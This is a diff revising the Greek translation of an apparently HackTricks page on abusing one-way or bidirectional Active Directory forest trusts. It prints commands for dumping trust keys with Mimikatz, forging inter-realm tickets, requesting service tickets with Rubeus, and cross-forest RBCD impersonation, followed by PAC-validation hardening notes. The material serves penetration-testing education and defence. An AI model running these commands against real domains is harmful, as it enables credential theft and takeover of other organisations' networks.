@@ -1,12 +1,12 @@
-# Εξωτερικό Forest Domain - OneWay (Inbound) ή αμφίδρομη
+# Εξωτερικό Forest Domain - OneWay (Inbound) ή bidirectional
 
 {{#include ../../banners/hacktricks-training.md}}
 
-Σε αυτό το σενάριο ένα εξωτερικό domain σας εμπιστεύεται (ή και τα δύο εμπιστεύονται το ένα το άλλο), οπότε μπορείτε να αποκτήσετε κάποιο είδος πρόσβασης σε αυτό.
+Σε αυτό το σενάριο ένα external domain σας εμπιστεύεται (ή και τα δύο σας εμπιστεύονται), επομένως μπορείτε να αποκτήσετε κάποιο είδος πρόσβασης σε αυτό.
 
-## Καταγραφή
+## Enumeration
 
-Πρώτα απ' όλα, πρέπει να **καταγράψετε** την **εμπιστοσύνη**:
+Αρχικά, πρέπει να κάνετε **enumerate** το **trust**:
 ```bash
 Get-DomainTrust
 SourceName      : a.domain.local   --> Current domain
@@ -59,15 +59,15 @@ IsDomain     : True
 # Additional trust hygiene checks (AD RSAT / AD module)
 Get-ADTrust -Identity domain.external -Properties SelectiveAuthentication,SIDFilteringQuarantined,SIDFilteringForestAware,TGTDelegation,ForestTransitive
 ```
-> `SelectiveAuthentication`/`SIDFiltering*` σας επιτρέπουν να δείτε γρήγορα αν τα cross-forest abuse paths (RBCD, SIDHistory) είναι πιθανό να λειτουργήσουν χωρίς επιπλέον προαπαιτούμενα.
+> `SelectiveAuthentication`/`SIDFiltering*` σάς επιτρέπουν να δείτε γρήγορα αν τα **cross-forest abuse paths** (RBCD, SIDHistory) είναι πιθανό να λειτουργήσουν χωρίς επιπλέον προαπαιτούμενα.<sup>[[2]](#references)</sup>
 
-Στην προηγούμενη enumeration βρέθηκε ότι ο χρήστης **`crossuser`** είναι μέσα στην ομάδα **`External Admins`** που έχει **Admin access** μέσα στον **DC του external domain**.
+Στην προηγούμενη enumeration διαπιστώθηκε ότι ο χρήστης **`crossuser`** βρίσκεται μέσα στο group **`External Admins`**, το οποίο έχει **Admin access** μέσα στο **DC του external domain**.
 
-## Αρχική Πρόσβαση
+## Initial Access
 
-Αν **δεν** καταφέρατε να βρείτε κάποια **ειδική** πρόσβαση του χρήστη σας στο άλλο domain, μπορείτε ακόμα να επιστρέψετε στην AD Methodology και να δοκιμάσετε να κάνετε **privesc from an unprivileged user** (πράγματα όπως kerberoasting για παράδειγμα):
+Αν **δεν μπορέσατε** να βρείτε κάποια **ειδική** πρόσβαση του χρήστη σας στο άλλο domain, μπορείτε και πάλι να επιστρέψετε στο AD Methodology και να δοκιμάσετε να κάνετε **privesc από έναν unprivileged user** (για παράδειγμα, πράγματα όπως το kerberoasting):
 
-Μπορείτε να χρησιμοποιήσετε τις **Powerview functions** για να κάνετε **enumerate** το **other domain** χρησιμοποιώντας την παράμετρο `-Domain` όπως σε:
+Μπορείτε να χρησιμοποιήσετε **Powerview functions** για να κάνετε **enumerate** το **άλλο domain**, χρησιμοποιώντας την παράμετρο `-Domain`, όπως στο:
 ```bash
 Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
 ```
@@ -75,28 +75,28 @@ Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
 ./
 {{#endref}}
 
-## Προσποίηση ταυτότητας
+## Impersonation
 
 ### Σύνδεση
 
-Χρησιμοποιώντας μια κανονική μέθοδο με τα διαπιστευτήρια των χρηστών που έχουν πρόσβαση στο external domain θα πρέπει να μπορείτε να αποκτήσετε πρόσβαση σε:
+Χρησιμοποιώντας μια κανονική μέθοδο με τα credentials των χρηστών που έχουν πρόσβαση στο εξωτερικό domain, θα πρέπει να μπορείτε να αποκτήσετε πρόσβαση:
 ```bash
 Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
 ```
-### Κατάχρηση SID History
+### Abuse του SID History
 
-Μπορείτε επίσης να καταχραστείτε [**SID History**](sid-history-injection.md) σε ένα forest trust.
+Μπορείτε επίσης να κάνετε abuse του [**SID History**](sid-history-injection.md) μέσω ενός forest trust.
 
-Εάν ένας χρήστης μεταφερθεί **από ένα forest σε άλλο** και το **SID Filtering δεν είναι ενεργοποιημένο**, γίνεται δυνατή η **προσθήκη ενός SID από το άλλο forest**, και αυτό το **SID** θα **προστεθεί** στο **token του χρήστη** κατά την αυθεντικοποίηση **μέσω του trust**.
+Αν ένας χρήστης μεταφερθεί **από ένα forest σε άλλο** και το **SID Filtering δεν είναι ενεργοποιημένο**, καθίσταται δυνατή η **προσθήκη ενός SID από το άλλο forest**, και αυτό το **SID** θα **προστεθεί στο token του χρήστη** κατά την authentication **μέσω του trust**.
 
 > [!WARNING]
-> Ως υπενθύμιση, μπορείτε να αποκτήσετε το κλειδί υπογραφής με
+> Ως υπενθύμιση, μπορείτε να αποκτήσετε το signing key με
 >
 > ```bash
 > Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
 > ```
 
-Μπορείτε να **υπογράψετε με** το **έμπιστο** κλειδί ένα **TGT που υποδύεται** τον χρήστη του τρέχοντος domain.
+Μπορείτε να κάνετε **sign με** το **trusted** key ένα **TGT που κάνει impersonate** τον χρήστη του τρέχοντος domain.
 ```bash
 # Get a TGT for the cross-domain privileged user to the other domain
 Invoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'
@@ -107,7 +107,7 @@ Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /d
 
 # Now you have a TGS to access the CIFS service of the domain controller
 ```
-### Πλήρης μέθοδος προσποίησης χρήστη
+### Πλήρης impersonation του χρήστη
 ```bash
 # Get a TGT of the user with cross-domain permissions
 Rubeus.exe asktgt /user:crossuser /domain:sub.domain.local /aes256:70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80 /opsec /nowrap
@@ -121,9 +121,9 @@ Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /d
 
 # Now you have a TGS to access the CIFS service of the domain controller
 ```
-### Cross-forest RBCD όταν ελέγχετε έναν λογαριασμό υπολογιστή στο trusting forest (no SID filtering / selective auth)
+### Cross-forest RBCD όταν ελέγχετε έναν λογαριασμό υπολογιστή στο trusting forest (χωρίς SID filtering / selective auth)
 
-Εάν ο foreign principal (FSP) σας τοποθετηθεί σε μια ομάδα που μπορεί να γράψει αντικείμενα υπολογιστών στο trusting forest (π.χ., `Account Operators`, προσαρμοσμένη provisioning ομάδα), μπορείτε να ρυθμίσετε **Resource-Based Constrained Delegation** σε έναν host-στόχο αυτού του forest και να προσποιηθείτε οποιονδήποτε χρήστη εκεί:
+Αν το foreign principal (FSP) σας εντάσσει σε μια ομάδα που μπορεί να εγγράφει computer objects στο trusting forest (π.χ. `Account Operators`, custom provisioning group), μπορείτε να ρυθμίσετε **Resource-Based Constrained Delegation** σε έναν target host αυτού του forest και να κάνετε impersonate οποιονδήποτε χρήστη εκεί:
 ```bash
 # 1) From the trusted domain, create or compromise a machine account (MYLAB$) you control
 # 2) In the trusting forest (domain.external), set msDS-AllowedToAct on the target host for that account
@@ -134,14 +134,15 @@ Set-DomainObject victim-host$ -Set @{'msds-allowedtoactonbehalfofotheridentity'=
 # 3) Use the inter-forest TGT to perform S4U to victim-host$ and get a CIFS ticket as DA of the trusting forest
 Rubeus.exe s4u /ticket:interrealm_tgt.kirbi /impersonate:EXTERNAL\Administrator /target:victim-host.domain.external /protocol:rpc
 ```
-Αυτό λειτουργεί μόνο όταν **SelectiveAuthentication is disabled** και **SID filtering** δεν απομακρύνει το controlling SID σας. Πρόκειται για μια γρήγορη lateral path που αποφεύγει το SIDHistory forging και συχνά παραβλέπεται σε trust reviews.
+Αυτό λειτουργεί μόνο όταν το **SelectiveAuthentication είναι απενεργοποιημένο** και το **SID filtering** δεν αφαιρεί το SID που ελέγχετε. Είναι ένα γρήγορο lateral path που παρακάμπτει το SIDHistory forging και συχνά παραβλέπεται στις αξιολογήσεις trust.<sup>[[2]](#references)</sup>
 
-### Σκληροποίηση επικύρωσης PAC
+### Ενίσχυση επικύρωσης PAC
 
-Οι ενημερώσεις επικύρωσης υπογραφής PAC για **CVE-2024-26248**/**CVE-2024-29056** προσθέτουν επιβολή υπογραφής στα inter-forest tickets. Σε **Compatibility mode**, forged inter-realm PAC/SIDHistory/S4U paths μπορούν ακόμα να λειτουργήσουν σε unpatched DCs. Σε **Enforcement mode**, unsigned ή παραποιημένα PAC δεδομένα που διασχίζουν ένα forest trust απορρίπτονται, εκτός αν κατέχετε και το target forest trust key. Registry overrides (`PacSignatureValidationLevel`, `CrossDomainFilteringLevel`) μπορούν να αδυνατίσουν αυτό όσο παραμένουν διαθέσιμες.
+Οι ενημερώσεις επικύρωσης υπογραφής PAC για τα **CVE-2024-26248**/**CVE-2024-29056** προσθέτουν υποχρεωτική υπογραφή στα inter-forest tickets. Σε **Compatibility mode**, τα forged inter-realm PAC/SIDHistory/S4U paths μπορούν να συνεχίσουν να λειτουργούν σε unpatched DCs. Σε **Enforcement mode**, τα unsigned ή tampered δεδομένα PAC που διασχίζουν ένα forest trust απορρίπτονται, εκτός αν διαθέτετε επίσης το trust key του target forest. Τα registry overrides (`PacSignatureValidationLevel`, `CrossDomainFilteringLevel`) μπορούν να το αποδυναμώσουν όσο παραμένουν διαθέσιμα.<sup>[[1]](#references)</sup>
 
 ## Αναφορές
 
-- [Microsoft KB5037754 – PAC validation changes for CVE-2024-26248 & CVE-2024-29056](https://support.microsoft.com/en-au/topic/how-to-manage-pac-validation-changes-related-to-cve-2024-26248-and-cve-2024-29056-6e661d4f-799a-4217-b948-be0a1943fef1)
-- [MS-PAC spec – SID filtering & claims transformation details](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/55fc19f2-55ba-4251-8a6a-103dd7c66280)
+- [1] [Microsoft KB5037754 – Αλλαγές στην επικύρωση PAC για τα CVE-2024-26248 & CVE-2024-29056](https://support.microsoft.com/en-au/topic/how-to-manage-pac-validation-changes-related-to-cve-2024-26248-and-cve-2024-29056-6e661d4f-799a-4217-b948-be0a1943fef1)
+- [2] [Προδιαγραφή MS-PAC – Λεπτομέρειες για SID filtering και claims transformation](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/55fc19f2-55ba-4251-8a6a-103dd7c66280)
+
 {{#include ../../banners/hacktricks-training.md}}
